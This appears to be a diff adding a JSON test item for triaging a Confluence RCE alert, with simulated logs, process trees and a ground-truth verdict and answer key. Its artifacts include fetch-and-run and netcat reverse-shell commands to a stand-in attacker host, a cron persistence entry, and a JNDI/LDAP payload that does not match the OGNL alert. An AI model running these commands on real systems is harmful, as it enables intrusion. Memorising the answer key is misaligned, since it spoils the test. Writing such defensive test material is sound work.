@@ -1,0 +1,78 @@
+{
+  "id": "A-1002",
+  "alert": {
+    "src": "203.0.113.52",
+    "dst": "10.2.1.153",
+    "dst_port": 8090,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Confluence OGNL RCE",
+    "claimed_cve": "CVE-2022-26134",
+    "severity": "low",
+    "ts": "2026-09-16T03:38:00Z",
+    "flow_id": "f9928"
+  },
+  "world": {
+    "assets": {
+      "10.2.1.153": {
+        "host": "host-10-2-1-153",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "8090": {
+            "product": "atlassian-confluence",
+            "version": "7.18.0"
+          }
+        },
+        "peers": [
+          "10.2.5.217"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2022-26134": {
+        "product": "atlassian-confluence",
+        "patched_in": "7.18.1",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f9928": {
+        "direction": "outbound",
+        "bytes_out": 84213,
+        "bytes_in": 512,
+        "duration_s": 604,
+        "state": "ESTABLISHED",
+        "note": "periodic 60s beacon to external host"
+      }
+    },
+    "logs": {
+      "host-10-2-1-153": [
+        "[host-10-2-1-153] 8090 POST /api/x 200 jndi:ldap://203.0.113.52/a  <- payload accepted",
+        "[host-10-2-1-153] spawned /bin/sh from service process"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-1-153": {
+        "suspicious": true,
+        "tree": "java -> sh -c 'curl 203.0.113.52|sh' -> nc 203.0.113.52 4444",
+        "persistence": "cron @reboot /tmp/.beacon"
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.52",
+        "dst": "10.2.1.153",
+        "port": 8090,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "SUCCEEDED",
+    "action": "contain"
+  },
+  "adversarial": true,
+  "solve_rationale": "vulnerable version + shell spawned + outbound beacon"
+}
